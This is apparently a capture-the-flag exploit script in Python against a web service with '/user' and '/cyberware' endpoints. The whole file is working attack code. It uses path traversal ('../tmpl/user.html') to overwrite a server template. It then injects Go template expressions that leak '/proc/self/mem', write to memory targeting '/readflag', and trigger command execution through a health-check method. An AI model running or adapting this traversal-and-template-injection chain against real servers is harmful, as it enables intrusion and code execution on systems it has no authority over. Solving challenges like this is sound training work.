import requests
import argparse

# Global variables
USERNAME = "viawia"

def send_user_request(host):
    url = f"{host}/user"
    data = {"username": USERNAME}
    response = requests.post(url, data=data)
    return response.text

def send_cyberware_request(host, name, cyberware_username):
    url = f"{host}/cyberware"
    params = {"username": cyberware_username}
    data = {"name": name, "username": USERNAME}
    response = requests.post(url, params=params, data=data)
    return response.text

def get_user(host, username):
    return requests.get(host+"/user", params={"username":username}).text

def main(remote):
    host = "http://localhost:8080"
    if (remote):
        host = remote
    # User request
    user_response = send_user_request(host)
    # print(user_response)

    # Cyberware request
    LEAK_MAPS = """
    #SICE{{.NewError "idk" "/proc/self/mem" }}SICE
    #"""
    send_cyberware_request(host, LEAK_MAPS, "../tmpl/user.html")
    print(get_user(host, USERNAME))

    #leak = "".join([chr(int(X)) for X in get_user(host, USERNAME).split("SICE")[1][1:-1].split(" ")])
    #print(leak)

    arb_write = """
    {{.SerializeErrors  "/readflag" 1 9680571}}
    """

    send_cyberware_request(host, arb_write, "../tmpl/user.html")

    print(get_user(host, USERNAME))

    exec_command = """
    {{.UserHealthcheck}}
    """

    send_cyberware_request(host, exec_command, "../tmpl/user.html")

    print(get_user(host, USERNAME))

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--remote", help="remote URL of challenge")
    args = parser.parse_args()
    main(args.remote)